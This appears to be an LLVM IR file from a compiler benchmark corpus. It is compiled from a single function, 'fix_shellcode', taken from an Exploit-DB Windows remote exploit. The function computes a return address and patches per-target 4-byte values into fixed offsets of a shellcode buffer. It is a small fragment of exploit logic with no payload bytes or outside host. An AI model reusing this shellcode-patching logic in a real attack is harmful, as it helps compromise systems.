; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23502.c_fix_shellcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23502.c_fix_shellcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64, %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32, i32, i32, i32, i32, i32 }

@target = common dso_local global %struct.TYPE_4__* null, align 8
@NOPS = common dso_local global i64 0, align 8
@_me = common dso_local global i64 0, align 8
@shellcode = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @fix_shellcode(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %4 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %5 = load i32, i32* %2, align 4
  %6 = sext i32 %5 to i64
  %7 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %4, i64 %6
  %8 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 0
  %9 = load i64, i64* %8, align 8
  %10 = load i64, i64* @NOPS, align 8
  %11 = call i64 @strlen(i64 %10)
  %12 = add i64 %9, %11
  %13 = load i64, i64* @_me, align 8
  %14 = call i64 @strlen(i64 %13)
  %15 = add i64 %12, %14
  store i64 %15, i64* %3, align 8
  %16 = load i64, i64* @_me, align 8
  %17 = add nsw i64 %16, 3
  %18 = bitcast i64* %3 to i8*
  %19 = call i32 @memcpy(i64 %17, i8* %18, i32 4)
  %20 = load i64, i64* @shellcode, align 8
  %21 = add nsw i64 %20, 15
  %22 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %23 = load i32, i32* %2, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %22, i64 %24
  %26 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %25, i32 0, i32 1
  %27 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %26, i32 0, i32 5
  %28 = bitcast i32* %27 to i8*
  %29 = call i32 @memcpy(i64 %21, i8* %28, i32 4)
  %30 = load i64, i64* @shellcode, align 8
  %31 = add nsw i64 %30, 48
  %32 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %33 = load i32, i32* %2, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %32, i64 %34
  %36 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %35, i32 0, i32 1
  %37 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %36, i32 0, i32 4
  %38 = bitcast i32* %37 to i8*
  %39 = call i32 @memcpy(i64 %31, i8* %38, i32 4)
  %40 = load i64, i64* @shellcode, align 8
  %41 = add nsw i64 %40, 58
  %42 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %42, i64 %44
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i32 0, i32 1
  %47 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %46, i32 0, i32 3
  %48 = bitcast i32* %47 to i8*
  %49 = call i32 @memcpy(i64 %41, i8* %48, i32 4)
  %50 = load i64, i64* @shellcode, align 8
  %51 = add nsw i64 %50, 70
  %52 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %53 = load i32, i32* %2, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %52, i64 %54
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i32 0, i32 1
  %57 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %56, i32 0, i32 2
  %58 = bitcast i32* %57 to i8*
  %59 = call i32 @memcpy(i64 %51, i8* %58, i32 4)
  %60 = load i64, i64* @shellcode, align 8
  %61 = add nsw i64 %60, 79
  %62 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %63 = load i32, i32* %2, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %62, i64 %64
  %66 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %65, i32 0, i32 1
  %67 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %66, i32 0, i32 1
  %68 = bitcast i32* %67 to i8*
  %69 = call i32 @memcpy(i64 %61, i8* %68, i32 4)
  %70 = load i64, i64* @shellcode, align 8
  %71 = add nsw i64 %70, 110
  %72 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %73 = load i32, i32* %2, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %72, i64 %74
  %76 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %75, i32 0, i32 1
  %77 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %76, i32 0, i32 0
  %78 = bitcast i32* %77 to i8*
  %79 = call i32 @memcpy(i64 %71, i8* %78, i32 4)
  ret i32 0
}

declare dso_local i64 @strlen(i64) #1

declare dso_local i32 @memcpy(i64, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
